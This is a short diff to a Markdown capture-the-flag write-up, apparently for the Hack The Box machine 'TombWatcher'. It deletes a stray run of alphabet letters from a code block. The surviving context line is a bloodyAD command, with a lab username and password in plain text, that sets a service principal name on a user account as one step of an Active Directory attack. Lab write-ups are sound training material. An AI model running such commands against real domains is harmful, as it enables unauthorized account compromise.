@@ -68,32 +68,6 @@ So let's give `Alfred` an `SPN`.
 **Command**
 ```bash
 bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object 'Alfred' servicePrincipalName -v 'w1ld/htb'     
-A
-B
-C
-D
-E
-F
-G
-H
-I
-J
-K
-L
-M
-N
-O
-P
-Q
-R
-S
-T
-U
-V
-W
-X
-Y
-Z
 ```
 
 **Output**
